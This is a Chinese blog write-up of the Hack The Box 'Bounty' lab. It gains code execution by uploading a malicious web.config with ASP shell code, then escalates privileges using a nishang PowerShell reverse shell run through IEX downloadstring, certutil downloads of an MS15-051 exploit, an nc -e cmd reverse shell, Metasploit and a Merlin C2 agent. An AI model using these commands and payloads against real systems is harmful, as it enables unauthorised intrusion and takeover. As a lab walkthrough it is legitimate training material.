> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9HJGSb71rPskUQJxinh2hw)

大余安全  

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **62** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/TT8ic2JKBb6jlK434RibHzNljr956UE1SoMjawkXtRicWE16SX040OVmERla7ia6PpRZEAhV7jXcq41cMGaXRibHy1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8MwpenCNAibmYVEdEYmTrUwKKp2e3RyLasUur0sQZ4lviaKFOwwgKfcp4pvbVNrpHrPoVhVEZjJ3IV0MAxQtbEZg/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/142

靶机难度：初级（3.7/10）

靶机发布日期：2018 年 11 月 2 日

靶机描述：

Bounty is an easy to medium difficulty machine, which features an interesting technique to bypass file uploader protections and achieve code execution. This machine also highlights the importance of keeping systems updated with the latest security patches.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

  

  

一、信息收集

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdrlrBia3Uoz1wlX5zKgjicO9sxX94M4gXqpibyTzk99GHcEvBmj8l0ekaQ/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.93...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdpHibNfZ2TXagvjQWiayqpB1SudibWlSnywN2jT3AwH4oA2UoaULbSnyQg/640?wx_fmt=png)

Microsoft IIS httpd 7.5... 这版本一般存在缓冲区溢出漏洞... 往下走看看...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdALaWZCnefwElBFjicCjp7RiaiaD3evtvLtcUNSjAZMElb8SnTWYP7f6sg/640?wx_fmt=png)

查看前端源码没发现什么....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdzZUGx08AHaMEyEibGOzSEwMibE72zWDPP9xoFY9O7fQpwMgRwNDPAWWg/640?wx_fmt=png)

```
gobuster -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx
```

Microsoft IIS httpd 7.5 知道这是 windows server 2008 R2 系统，一般都存在 aspx 动态网页文件... 发现了 tranfer.aspx

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdAbqlub2oePkGN5QicHx8kG7uJcGLictxLVzCOpcdfWx0frgwic0N7v5xA/640?wx_fmt=png)

正常访问，可以上传文件...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd5psiacG5odLxdA2sO3b3oicGljuAzQGaRXaK7Doe4wvib9TS9JwFDXqiag/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdHIucgy8YvhiaqeJI9Gm9XKb6EPZZPiaspLrFKeDB8eHsNWjb0mCNzHdA/640?wx_fmt=png)

上传 PHP 没成功，尝试 asxp 文件也无法成功上传.... 显示文件无效...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdcXe8aKANHnxR1LLupXgz5L1o4HsrlDMJQMvunKUBciaBNQN2zy1MmAg/640?wx_fmt=png)

经过尝试 GIF 格式文件是可以上传的... 这边可以开始玩扩展程序了...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdSJmwfXUZ5ZZqkqD5DpCTibAcmPSNEC67BcKrU5yphgMRt8GpUxtic8oQ/640?wx_fmt=png)

发送到 Repeater 分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdZadukQlY3S27mZ4tzfiak75I39CZFj62pTJSLztrSSQ5rnXxCnkJ2oQ/640?wx_fmt=png)

继续测试发现 config，继续分析...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd8iaMxS2KF7sZuzpJE0EMicgHPTC2j3DeSFBHAddCXJ3iaQRqatTjnSrOg/640?wx_fmt=png)现在我针对不同的文件扩展名进行检测...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdbrvjJeWXGjdoBegnAWSQps8ffwILv6LownicgVzqxsTic5CEwCMYYY4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdHhuGNBAbfDrMI94v1UnnOuj5h7uEWSx6wwGnoyHSHMbt49729K3ODA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdwvmY1If5iaGr2wmDWythoSZhaI5hmB1E4YdRBx6SRxRAevcUiawrpsdQ/640?wx_fmt=png)

经过对扩展名注入的攻击，发现了字节数 1350-1355 之间存在 5 个字节可利用... 因为他们的状态都是 200 成功上传的... 说明这里可以利用 RCE 进行攻击...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdDU4XkASFhg43Jb7icS1m02x3MibpicAgyH1bYOvFVXuwuyBbVzsvf90AA/640?wx_fmt=png)

可以通过谷歌搜索 rce 攻击...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdPg5tuYBB4AINS22niaUsP8O6Xsj7hyjy9f2hzDQpaj4j3gazNbbDJ8Q/640?wx_fmt=png)

原文作者的代码是源代码，需要自己修改，我没这个能力，我去查看了 Soroush 的文章...

```
[链接](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd6QEH0PjuHyNhPcazhLDT2drXTT3wRSPHGmP64vicGUlb6FWPAmBmDEg/640?wx_fmt=png)

在图中可以看到相关于 web.config 利用在哪些版本，以及怎么绕过的简单原理...

```
[链接](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
想学习更多：https://github.com/wireghoul/htshells
```

继续...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zdiaia36fGWEibD5hoVtgyehsUonLPyNwsu19Oq5Vv6ckG7fF36Tziag8oTA/640?wx_fmt=png)

copy 到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdKNgG13LP6VJL2aN35ADGmopmtJakrG4yQib5S0icRDIicQ1yeT7qhyozA/640?wx_fmt=png)

经过上传后，执行回复 3... 响应点是正确的，利用即可...GO

这里 kali 自带的简单的 web.config 绕过文本内容...

继续...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdnTldMcXzniaeNlDjMSseFNbJZmLnMa7sibCNevVJO9ZZDk1IpAL7qNlA/640?wx_fmt=png)

```
php
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c ping 10.10.14.16")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

利用简单的 web.config 注入代码，利用 icmp 反包测试成功...

  

  

二、提权

  

  

利用 ps1 反向 shell 提权即可....（谷歌很多 ps1 的 shell 脚本）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdTibIpuXnwlZEFBL8ck9ToTzwuKQH64XOT8UGibGlkb00Apwvh1c09SVQ/640?wx_fmt=png)

```
curl -sk https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 > dayu.ps1
```

```
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 6666' >> dayu.ps1  ---写入反向外壳
cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.16/dayu.ps1')  --修改web.config
```

成功通过 80 访问上传反向 shell... 获得低权用户...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd57N6svusaKtuoO2z4SRBZF2app114avbqdBhdzFoScHjS86fiawneuA/640?wx_fmt=png)

可以看出版本，以及这是个未打补丁新的系统....

前面也遇到过很多，应该很多漏洞，我这里利用了 ms15-051...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdtjMNEPvoYNwBzBS8MuCCGRsn8lfj7cMWy8Ia58wr4h5dYjBHMibfNsg/640?wx_fmt=png)

```
certutil -urlcache -f http://10.10.14.5/ms15-051.exe dayu.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdItyfMzjKWktlomibCBWlGQfBMNjibzIJ9M6iaZXoJ501ez9yhjhmEmXAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdvNPZ09MmvqUbIHCic0OUOeYs8rrFgo7ZUGoSMfeyxgIBFDLOm9O5Lrw/640?wx_fmt=png)

```
./dayu.exe "c:\Users\merlin\Desktop\nc64.exe -e cmd 10.10.14.5 7777"
```

通过上传 ms15-051.exe 和 nc，执行即可...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd2ZUntM9QVKHMVSic9Nwmv7SaicXWFsX2R44gCt45gdhDiaZURVAWFdrpw/640?wx_fmt=png)

成功获得 root.txt....

  

  

方法 2：

  

  

利用 MSF 解析下...GO

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdHZTY5yfZRUiazhNRLgACxPWDreTyWZkrNmeZ4LXLkUO3VvnZLao3ovw/640?wx_fmt=png)

这里利用生成一个反向 shell.exe，通过 certutil.exe 上传到靶机，通过 handler 进行监听...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZduvMGHpxppiciax8rOBNotvOOFDk6cebK48grUHusN0RIibfsOr9ZS7o9w/640?wx_fmt=png)

可以看到 X64 有两个漏洞可以利用... 看看 X86 扫描也有很多漏洞可利用...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd8ic0r3zjHvCpngkW9KujrWxvdfavZdb7NjbJcyBia8zBiaBj6fhVy7MSA/640?wx_fmt=png)

我这里就随便演示一个，成功获得 system 权限查看两个 flag...

  

  

方法 3：

  

  

利用 Merlin 代理进行渗透提权.... 为什么用它，因为此靶机页面是一张向导的老人图... 使用 HTTP/2.0 进行渗透更有效... 我也第一次学习，走起

Merlin 是使用 golang 编写的跨平台的利用后 HTTP / 2 命令和控制服务器和代理...（Golang 语言编写的...666）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdreSzDnGkicTSBwiapSJnCiaiaQYiaNMrRJ7gJ09Xt87YEhSOzjGp3h2k7uQ/640?wx_fmt=png)

```
git clone https://github.com/Ne0nd0g/merlin
```

第一步就是下载 Merlin...

由于 Merlin 是 golang 语言编译的，需要下载 apt-get install golang 才可以运行...

Merlin 打开需要创建 X509 的 SSL....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zdh8AyBGqRt0wpnvdxq2I80RCVczrCnuHnCSf37ccByiaQT0Ip0InYs3w/640?wx_fmt=png)

给自己创建了 key，时间为 7 天... 开始 Merlin 之旅...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdLwkobbYWeGO5nibn2Mw7qGKrDdyMWu2Y3gXUK7JCicUnmTjqgtWTx40g/640?wx_fmt=png)

可以看到运行 go run 命令，还需要更新源文件内容，等几分钟自动更新就好...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd2QHuAFtHQPBpsAib0aZKpRZ18ic2Z145RSyeyJA4ZUqGySf7LIrZqz7Q/640?wx_fmt=png)

命令：`go run main.go`

运行后，根据提示已经通过 X.509 的密匙成功运行了... 这边发现 IP 地址是本地的，需要修改成 tun0 里的地址...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7Zd418bkmkUA9osmZA4bMuu4zkfOZ08wwFbuR0uopDgibeWibd58eQcztjA/640?wx_fmt=png)

```
go run main.go -i 10.10.14.5
```

通过 - i 来修改本地 IP...OK

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdWhvVRdQKqib840pHUJvdqHISBzI2MAYhYmPVpSUxhJLRFk1nHBX7QxA/640?wx_fmt=png)

```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.10.14.5:443" -o dayu.exe main.go
```

这里需要利用 main.go 创建一个 exe 链接 Mrelin...

前面是打错了几次命令，报错了...-X 是 HTTP/2.0 专属的二进制传输...-o 是输出文件... 意思就是创建 windows64 位的二进制文件....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdJaS2GgqbSX7So51Kcib8hVLAYF95usENBMkoOCibLIlibMGMpvpQrsuOQ/640?wx_fmt=png)

```
certutil -urlcache -split -f http://10.10.14.5/dayu.exe C:\\users\\public\\dayu.exe
```

上传该文件....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNEI3jE1xmiaticfvicgr6h7ZdLLNb9QxngEicmic95htKcELRn53vqfFmKdeTZ762vFbbMAxGSlxJcwMA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/TT8ic2JKBb6jlK434RibHzNljr956UE1SoMjawkXtRicWE16SX040OVmERla7ia6PpRZEAhV7jXcq41cMGaXRibHy1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/8MwpenCNAibmYVEdEYmTrUwKKp2e3RyLasUur0sQZ4lviaKFOwwgKfcp4pvbVNrpHrPoVhVEZjJ3IV0MAxQtbEZg/640?wx_fmt=png)

好的，我从下午到晚上凌晨都卡在这而，按照思路是通过 EXE 以及 server.crt 在 main.go 上获得靶机的信息... 注入可以看出，他在本地执行了 merlin... 按照回复的命令我应该要到靶机上./dayu.exe \\10.10.14.5.... 此类命令.... 这方法我肯定不会去尝试，那不是直接得拿到权限才能使用的方法，那还有啥意思.... 我应该在前面 SSL 或者 EXE 生成的时候少了代码... 能力有限啊... 如果有大佬看到最后，希望给个解决方法，感激不尽，我放弃了....

我查看了 Merlin 作者的 Twitter，没有此类的解决信息... 这是一款黑客经常使用的渗透测试的软件，我是没找到网上有啥视频或者别的很仔细的教程... 希望有的分享下，谢啦！！！

这台靶机还是很舒服的，我玩了 burpsuit 对靶机的各种注入，比较舒服，大家可以尝试玩玩...

由于我们已经成功得到 root 权限查看 user.txt 和 root.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

**2021.6.9~2021.6.16 号开启收徒模式，实战教学，有想法的私聊！**  

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)